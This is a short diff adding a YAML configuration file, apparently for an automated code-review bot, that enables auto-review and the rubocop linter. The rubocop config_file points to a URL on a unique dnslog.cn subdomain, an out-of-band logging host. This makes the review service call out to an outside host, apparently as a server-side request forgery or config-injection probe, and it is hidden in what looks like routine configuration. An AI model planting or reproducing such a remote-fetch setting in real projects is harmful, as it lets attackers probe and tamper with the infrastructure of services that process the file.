@@ -1,0 +1,8 @@
+language: en-US
+reviews:
+  auto_review:
+    enabled: true
+  tools:
+    rubocop:
+      enabled: true
+      config_file: "http://cfgfile101537-8f3a.unglui.dnslog.cn/rubocop.yml"
